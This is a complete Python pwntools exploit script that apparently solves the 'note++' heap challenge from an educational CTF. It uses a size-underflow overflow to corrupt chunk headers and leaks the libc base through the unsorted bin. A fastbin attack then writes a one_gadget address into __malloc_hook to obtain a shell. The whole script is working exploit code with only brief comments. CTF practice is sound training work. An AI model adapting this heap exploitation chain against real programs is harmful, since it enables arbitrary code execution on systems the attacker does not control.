# python 2.7 for better compatibility, step corresponding to writeup.md
from pwn import *

context.clear(arch='x86_64')

# r = remote('edu-ctf.csie.org', 10181)
r = process('./note++')
libc = ELF('./libc.so', checksec=False)

def add(size, note, description):
    r.recvuntil('>')
    r.sendline('1')
    r.sendlineafter('Size: ', str(size))
    r.sendlineafter('Note: ', str(note))
    r.sendlineafter('note: ', str(description))

def show():
    r.recvuntil('>')
    r.sendline('2')

def delete(idx):
    r.recvuntil('>')
    r.sendline('3')
    r.sendlineafter('Index: ', str(idx))

add(0x18, '\x18', '\x18') # n0
add(0x77, '\x78', '\x78') # n1
add(0x18, '\x18', '\x18') # n2
add(0x18, '\x18', '\x18') # n3

delete(0)

############### Step 1 ########################
# make n1 size grow up to 0xa0 (small bin) to be thrown to unsorted bin
# -1 --> unsigned int --> overflow
p = ''
p += (p64(0xdaddbeef))
p += (p64(0xdaddbeef))
p += (p64(0x0))
p += (p64(0xa1))
# make n[0] pollute n[1]'s chunk header
add(0x0, p, '\x87' * 48)

# fastbin[0x20] --> n[0]
# unsorted bin --> n[1]
delete(0)
delete(1)


# buff n[0] to make n[1], overwrite the is_freed flag
add(0x18, '\x18' * 8, '\x18' * 0x30) # n0
show()

r.recvuntil('Note 1:\n  Data: ')
libc_base = u64(r.recv(6) + '\0\0') - 0x3c4b78
print('libc_base --> ', hex(libc_base))

############### Step 2 ########################
add(0x68, '\xaa' * 8, '\xaa' * 0x30) # n[4]
add(0x68, '\xaa' * 8, '\xbb' * 0x30) # n[5]
delete(4)
delete(5)

# padding before 4, to overwrite the is_freed flag for delete n[4], n[5]. n[4] fastbin attack
delete(3)
add(0x18, '\xaa' * 8, '\xbb' * 0x30)
delete(4)

'''
add(0x38, '\x28', 'DOUBLE_FREE_11') #n[4]
add(0x38, '\x38', 'DOUBLE_FREE_22') #n[5]

delete(4)
delete(5)

add(0x38, '\x18', 'X' * 0x30) # padding before n[5] to make is_freed become false
'''

############### Step 3 ########################
# padding the size header for fastbin
malloc_hook = libc_base + libc.sym.__malloc_hook - 0x13

print('malloc_hook --> ', hex(malloc_hook))
add(0x68, p64(malloc_hook), 'MALLOC_HOOK')
add(0x68, '\x18', '\x87' * 48)
add(0x68, '\x18', '\x87' * 48)

binsh = libc_base + libc.search('/bin/sh').next()
system = libc_base + libc.sym.system
one_gadget = libc_base + 0xf02a4
print('one_gadget --> ', hex(one_gadget))

# *(__malloc_hook) = one_gadget
add(0x68, '\x87' * 0x3 + p64(one_gadget), 'ONE_GADGET')
r.interactive()
